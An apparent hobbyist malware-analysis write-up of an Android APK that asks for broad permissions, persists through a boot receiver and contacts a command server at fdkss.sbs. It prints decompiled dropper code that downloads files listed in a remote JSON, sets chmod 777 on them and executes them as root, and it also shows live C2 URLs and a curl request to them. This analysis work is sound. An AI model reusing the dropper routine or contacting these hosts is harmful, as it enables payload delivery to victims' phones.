# 37c82c333789eebc9c4c2177e8f2af5a9e59afbbd084edf28823b787651c8239.apk

Malware SHA256: 37c82c333789eebc9c4c2177e8f2af5a9e59afbbd084edf28823b787651c8239

## Steps

### 1. AndroidManifest.xml

I first ran my small python script that parses `AndroidManifest.xml`.

This was the result I got:

```bash
[*] FOUND: found a dangerous permission: android.permission.ACCESS_COARSE_LOCATION
[*] FOUND: found a dangerous permission: android.permission.CAMERA
[*] FOUND: found a dangerous permission: android.permission.POST_NOTIFICATIONS
[*] FOUND: found a dangerous permission: android.permission.READ_CONTACTS
[*] FOUND: found a dangerous permission: android.permission.READ_EXTERNAL_STORAGE
[*] FOUND: found a dangerous permission: android.permission.READ_MEDIA_IMAGES
[*] FOUND: found a dangerous permission: android.permission.READ_MEDIA_VIDEO
[*] FOUND: found a dangerous permission: android.permission.READ_PHONE_STATE
[*] FOUND: found a dangerous permission: android.permission.READ_SMS
[*] FOUND: found a dangerous permission: android.permission.RECORD_AUDIO
[*] FOUND: found a dangerous permission: android.permission.SEND_SMS


[*] FOUND: application: ['com.android.append.App']

[*] FOUND: activity: com.android.append.view.LauncherActivity
[*] FOUND: activity: com.android.append.view.MainActivity
[*] FOUND: activity: com.android.append.view.RequestPermissionsActivity
[*] FOUND: activity: com.android.append.view.LoginActivity


[*] FOUND: service: com.android.append.AppendService
[*] FOUND: service: com.android.append.KeepAliveJobService
[*] FOUND: service: com.android.append.OverlayAccessibilityService
[*] FOUND: service: com.android.append.ActivityMonitorAccessibilityService


[*] FOUND: receiver: com.android.append.BootReceiver
        [*] FOUND: receiver action: android.intent.action.BOOT_COMPLETED
        [*] FOUND: receiver action: android.intent.action.USER_PRESENT
        [*] FOUND: receiver action: android.intent.action.SCREEN_ON
        [*] FOUND: receiver action: android.intent.action.ACTION_POWER_CONNECTED
        [*] FOUND: receiver action: android.net.wifi.WIFI_STATE_CHANGED
        [*] FOUND: receiver action: android.intent.action.MY_PACKAGE_REPLACED
        [*] FOUND: receiver action: android.intent.action.LOCKED_BOOT_COMPLETED
        [*] FOUND: receiver action: android.intent.action.USER_INITIALIZE
        [*] FOUND: receiver action: android.intent.action.USER_SWITCHED
[*] FOUND: receiver: androidx.profileinstaller.ProfileInstallReceiver
        [*] FOUND: receiver action: androidx.profileinstaller.action.INSTALL_PROFILE
        [*] FOUND: receiver action: androidx.profileinstaller.action.SKIP_FILE
        [*] FOUND: receiver action: androidx.profileinstaller.action.SAVE_PROFILE
        [*] FOUND: receiver action: androidx.profileinstaller.action.BENCHMARK_OPERATION


[*] FOUND: provider: androidx.startup.InitializationProvider
```

I was glad to see that most of the components were in the same package `com.android.append` and there weren't that many of them to begin with.

Oddly enough, there wasn't a main / launcher activity (confirmed that by installing the APK on my android emulator and seeing nothing new on the home screen as well), so I assume this app would be started by some other app.

## 2. What to analyze?

`androidx.profileinstaller.ProfileInstallReceiver` seems to be a part of the legitimate Android Jetpack libraries. Same with `androidx.startup.InitializationProvider`.

The other broadcast receiver looks more interesting. It's very aggresive in its `<intent-filter>`, for instance, using `android.intent.action.BOOT_COMPLETED` action.

Or `android.intent.action.LOCKED_BOOT_COMPLETED`, which implies the want to run even while the user's phone is on, but still locked.

Perhaps I should look at this component first.

## 3. Receiver (or rather, a useful detour)

The receiver only has a single `onReceive` method. Interestingly, it puts this into logcat: `Log.d("666", "Receive " + intent.getAction());`, perhaps the malware author uses "666" to later grep the logs in logcat. Actually, I want to step away from static analysis for a bit and for the sake of curiosity grep this myself.

Nevermind, apparently "666" is the tag argument, I can run `adb logcat -s 666` to filter the messages now (no grep needed).

I launch the APK manually `adb shell am start -n com.android.append/.view.LauncherActivity` (because no home screen launcher) and try the command (because the 666 is used to tag all of the author's log messages it seems like, not only in the receiver file).

Output:

```log
--------- beginning of kernel
--------- beginning of main
--------- beginning of system
--------- beginning of crash
10-21 15:11:25.512 10333 10333 D 666     : AppendService is onCreate.
10-21 15:11:25.548 10333 10333 D 666     : JobService task already schedule.
10-21 15:11:25.653 10333 10376 W 666     : Failed to comm server: Cannot connect to server.
10-21 15:11:25.653 10333 10376 W 666     : URL: http://fdkss.sbs/client/j.ashx
10-21 15:11:25.653 10333 10376 W 666     : Exception: Unable to resolve host "fdkss.sbs": No address associated with hostname
10-21 15:11:25.739 10333 10379 W 666     : Failed to comm server: Cannot connect to server.
10-21 15:11:25.739 10333 10379 W 666     : URL: http://fdkss.sbs/client/a.ashx
10-21 15:11:25.739 10333 10379 W 666     : Exception: Unable to resolve host "fdkss.sbs": No address associated with hostname
10-21 15:11:27.543 10333 10391 W 666     : Failed to comm server: Cannot connect to server.
10-21 15:11:27.543 10333 10391 W 666     : URL: http://fdkss.sbs/client/b.ashx
10-21 15:11:27.543 10333 10391 W 666     : Exception: Unable to resolve host "fdkss.sbs": No address associated with hostname
10-21 15:11:31.533 10333 10402 D 666     : No read external or media files permission.
10-21 15:11:31.536 10333 10404 D 666     : No READ_CONTACTS permission.
10-21 15:11:31.536 10333 10403 D 666     : No READ_SMS permission.
10-21 15:11:36.531 10333 10385 V 666     : Service is running.
10-21 15:11:36.553 10333 10419 W 666     : Failed to comm server: Cannot connect to server.
10-21 15:11:36.553 10333 10419 W 666     : URL: http://fdkss.sbs/client/a.ashx
10-21 15:11:36.553 10333 10419 W 666     : Exception: Unable to resolve host "fdkss.sbs": No address associated with hos
```

The messages then just loop.

I love this. From now on, I will always grep whether the malware author forgot to disable their own logging.

This tells us a lot, namely the fact that it's trying to connect to an external server `http://fdkss.sbs/client/j.ashx`, maybe a C2. Perhaps I will return later to intercept the request.

The receiver starts the service `context.startForegroundService(new Intent(context, (Class<?>) AppendService.class));`. I will assume this is the main one.

## 4. The main service

There also seems to be utility like `KeepAliveJobService` and 2 more services, but I'd rather try to follow what seems most important.

First, there is threading:

```Java
private Runnable d() {
        return new Runnable() { // from class: J.b
            @Override // java.lang.Runnable
            public final void run() {
                this.f808a.e();
            }
        };
    }
```

The method `e()` the thread runs (I assume the bulk of the malware logic in this sequence of obfuscated method calls):

```Java
    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void e() {
        AbstractC0108i.c();
        if (L.a.f1096c.h()) {
            return;
        }
        c.w();
        c.x();
        f.h();
        i.e();
        a.e();
        H.e();
        W.i();
        b.g();
        d.f();
        e.h();
        i();
        KeepAliveJobService.b(this);
    }
```

And the thread is actually started when the service is created by appending to the message queue. `post(d())` refers to our anonymous Runnable instance. Handler and main looper is just Android API stuff.

```Java
@Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        h();
        B.b(this);
        Log.d("666", "AppendService is onCreate.");
        new Handler(Looper.getMainLooper()).post(d());
    }
```

It seems that there are very deep nests of methods calling other methods. With enough patience it's possible, but since multiple calls happen per 1 method, manually trying to trace the call trees is quite difficult and impractical.

### 5. Extra

Even just running `strings classes.dex` gives us this:

```shell
http://fdkss.sbs/client/a.ashx
http://fdkss.sbs/client/b.ashx
http://fdkss.sbs/client/c.ashx
http://fdkss.sbs/client/d.ashx
http://fdkss.sbs/client/e.ashx
http://fdkss.sbs/client/f.ashx
http://fdkss.sbs/client/g.ashx
http://fdkss.sbs/client/h.ashx
http://fdkss.sbs/client/i.ashx
http://fdkss.sbs/client/j.ashx
http://fdkss.sbs/client/k.ashx
http://fdkss.sbs/client/l.ashx
http://fdkss.sbs/elf/files.json
```

So the URLs aren't encrypted. That's lucky. I tried to search for the first link in decompiled Java source, nothing interesting.

Tried to search for the last one (because it was a bit different) and found this beauty:

```Java
@Override // O.F
protected void c(String str) throws Exception {
    if (!J.M.a()) {
        throw new Exception("No superuser permission");
    }
    z.b bVar = new z.b();
    TimeUnit timeUnit = TimeUnit.SECONDS;
    D0.z zVarA = bVar.b(10L, timeUnit).c(20L, timeUnit).a();
    D0.C cA = new C.a().i("http://fdkss.sbs/elf/files.json").b().a();
    StringBuilder sb = new StringBuilder();
    D0.E eI = zVarA.r(cA).i();
    try {
        if (!eI.F()) {
            throw new IOException("Unexpected code " + eI.A());
        }
        String strG = eI.i() != null ? eI.i().G() : "";
        int iA = eI.A();
        eI.E();
        if (iA != 200) {
            throw new Exception("HTTP status code = " + iA);
        }
        JSONArray jSONArray = new JSONObject(strG).getJSONArray("files");
        for (int i2 = 0; i2 < jSONArray.length(); i2++) {
            JSONObject jSONObject = (JSONObject) jSONArray.get(i2);
            String string = jSONObject.getString("url");
            String string2 = jSONObject.getString("path");
            String string3 = jSONObject.getString("hash");
            boolean zOptBoolean = jSONObject.optBoolean("execute", false);
            int iD = d(string2, string3);
            if (iD != 0) {
                if (iD == 1) {
                    sb.append("File \"");
                    sb.append(string2);
                    sb.append("\" does not exist.\n");
                } else if (iD != 2) {
                    sb.append("File \"");
                    sb.append(string2);
                    sb.append("\" status unknown.\n");
                } else {
                    sb.append("File \"");
                    sb.append(string2);
                    sb.append("\" hash mismatch.\n");
                }
                int i3 = 0;
                while (i3 != 3) {
                    File file = new File(P.d.c(J.B.f726a), P.e.h(16));
                    P.h.b(string, file);
                    i3++;
                    if (d(file.getAbsolutePath(), string3) == 0) {
                        String str2 = "mkdir -p \"$(dirname " + string2 + ")\";\ncp -F " + file.getAbsolutePath() + " " + string2 + ";\nchmod 777 " + string2 + ";\nrm -f " + file.getAbsolutePath();
                        if (zOptBoolean) {
                            str2 = str2 + "\n" + string2 + " &";
                        }
                        o.a aVarN = P.o.n(str2);
                        if (aVarN.f1408a) {
                            throw new Exception("Failed to copy file \"" + string2 + "\": " + aVarN.f1410c);
                        }
                        sb.append("File \"");
                        sb.append(string2);
                        sb.append("\" updated successfully.\n");
                        if (zOptBoolean) {
                            sb.append("File \"");
                            sb.append(string2);
                            sb.append("\" executed.\n");
                        }
                    }
                }
                throw new Exception("Failed to download file \"" + string2 + "\" from \"" + string + "\",cause hash mismatch.");
            }
            sb.append("File \"");
            sb.append(string2);
            sb.append("\" is correct.\n");
        }
        eI.close();
        this.f1354c = sb.toString();
    } catch (Throwable th) {
        if (eI != null) {
            try {
                eI.close();
            } catch (Throwable th2) {
                th.addSuppressed(th2);
            }
        }
        throw th;
    }
}
```

It seems to be getting some kind of json file and further parsing it for "files" - perhaps reference to a new payload to later download onto the phone (potentially a "dropper" pattern where malware installs other malware): `JSONArray jSONArray = new JSONObject(strG).getJSONArray("files");`.

I was about to move on, because when a malware is uploaded to Malware Bazaar, I wouldn't expect their servers to still be up, but luckily it was still operating: `curl -s -o files.json 'http://fdkss.sbs/elf/files.json'` didn't give me the json, it blocked me from getting it, but it was still an HTTP 200 on VirusTotal URL lookup.

## 6. Dynamic analysis

Next I tried to attach a frida hook, specifically for class `B0` method `d()` (note to self in the future: I should really be commenting and renaming functions I understand) to see if I can intercept the json that's being downloaded.

The malware seems to have detected that and killed my frida-server on the emulator: `Failed to attach: unable to connect to remote frida-server: closed`. One option is to try to rename the server.

After managing to get everything set up (wiping the emulator just in case of some artifacts used to track prior execution, reinstalling the APK, frida renamed, network enabled, starting the activity + attaching the script hook in quick succession, running logcat on another cmd), I didn't succeed, but at least got something different:

```log
10-22 23:21:34.996  6203  7482 W 666     : Server returned error response.
10-22 23:21:34.996  6203  7482 W 666     : URL: http://fdkss.sbs/client/j.ashx
10-22 23:21:34.996  6203  7482 W 666     : Status Code: 523
```

By "didn't succeed" I mean that in the end the json downloading function wasn't even reached, so the hook didn't run.

523 is a Cloudflare error, probably blocking my IP at this point. Although prior to all this I tried to go to that URL in the tor browser and had the same result, so that may be irrelevant.

My best hypothesis (or rather, an uneducated guess) is that it first uses `http://fdkss.sbs/client/j.ashx` to confirm something / get some kind of token that I'm not a tester, but rather am an unsuspecting user with all permissions given etc., only then uses `http://fdkss.sbs/elf/files.json` to get the final payload. Bypassing the first URL logic / block may not be trivial.

Time to read every line of smali I guess.

Maybe not ðŸ« 
